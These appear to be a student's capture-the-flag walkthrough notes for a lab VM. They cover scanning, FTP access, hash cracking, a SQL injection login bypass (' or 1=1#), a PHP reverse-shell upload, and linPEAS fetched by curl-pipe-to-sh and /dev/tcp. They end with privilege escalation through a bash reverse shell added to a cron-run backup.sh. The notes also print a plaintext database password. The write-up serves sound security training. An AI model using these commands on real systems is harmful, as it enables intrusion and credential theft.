* After switching on the machine, we can start scanning from Kali Linux to discover the machine and do further operations:

```bash
netdiscover -r 192.168.57.0/24
#192.168.57.7
```

```bash
nmap -T4 -p- -A 192.168.57.7
```
* nmap results
```bash
Nmap scan report for 192.168.57.7
Host is up (0.0059s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.57.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.72 seconds
```
- ftp
	- **vsftpd 3.0.3**
	- ftp-anon: Anonymous FTP login allowed 
		- note.txt
- ssh
- http
	- wesbite is apache debian default page
	- **Apache/2.4.38 (Debian) Server at 192.168.57.7 Port 80**

  * FTP
  ```bash
  ftp 192.168.57.7
  # u Anonymous 
  # p anon

  get note.txt
  exit
  cat note.txt

# Hello Heath !
# Grimmie has setup the test website for the new academy.
# I told him not to use the same password everywhere, he will change it ASAP.

# I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

# INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
# ('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

# The StudentRegno number is what you use for login.

# Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
# We can always adapt it to our needs.

# -jdelta

  ```
- can use hashcat to try and crack hash
```bash
hashcat –m 0 hashes.txt /usr/share/wordlists/rockyou.txt
#student
```
  
  - scanning the site
  ```bash
  nikto -h 192.168.57.7 #lists all vuln in website
# ---------------------------------------------------------------------------
# + Server: Apache/2.4.38 (Debian)
# + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
# + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
# + No CGI Directories found (use '-C all' to force check all possible dirs)
# + Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
# + /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5c37b0dee585e, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
# + OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
# + /phpmyadmin/changelog.php: Cookie goto created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
# + /phpmyadmin/changelog.php: Cookie back created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
# + /phpmyadmin/changelog.php: Uncommon header 'x-ob_mode' found, with contents: 1.
# + /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
# + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
# + /phpmyadmin/: phpMyAdmin directory found.
# + /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/
# + 8254 requests: 0 error(s) and 12 item(s) reported on remote host
# + End Time:           2024-02-11 11:13:26 (GMT-5) (51 seconds)
# ---------------------------------------------------------------------------
# + 1 host(s) tested

 ```
  - phpmyadmin

  ```bash
dirb http://192.168.57.7 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r 
# -r don't search recursively

  ```

* http://192.168.57.7/academy
	* login portal. 
		* try SQL injection
		* `' or 1=1#` => works
* http://192.168.57.7/academy/my-profile.php
	-  Student Name - Rum Ham; 
	- Student Reg No - 10201321; 
	- Pincode - 777777; 
	- CGPA - 7.60.
	* option to upload profile pic
		* try reverse shell
			* search php reverse shell
			* https://www.revbashs.com
- listen
	- `nc -lvnp 3333`
- upload file
- upgrade shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
echo $TERM
stty -a
stty raw -echo; fg # zsh specific
# enter

# use vars from previous output
$ export bash=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
```

```bash
whoami
# www-data
```



- privesc needed
	- use linpeas for automatic scanning
	- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- download
```bash
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Without curl
python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"

# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```
- execute
  ```bash
  # attacker
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
  sudo python3 -m http.server 80
  # victim
  cd /tmp
  wget http://192.168.57.5/linpeas.sh
  chmod +x linpeas.sh 

  ./linpeas.sh 
```
![](assets/Pasted%20image%2020240211175842.png)
  - /home/grimmie/backup.sh flagged
```bash
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip
```
- /var/www/html/academy/includes/config.php
```php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
?>
  ```
  - user+ SQL password
  - works in phpmyadmin
```bash
cat /etc/passwd
# grimmie = admin
# su grimmie #works
ssh grimmie@192.168.57.7
```

- admin account access, but no sudo executable
	- check backup execution
	- `crontab -l` empty
	- probably run somewhere else
	- chekc with `pspy64`

* add rev shell to backup.sh
```bash
# attacker
nc -nvlp 8888
# grimmie
nano backup.sh
bash -i >& /dev/tcp/192.168.57.5/8888 0>&1
```

- root access
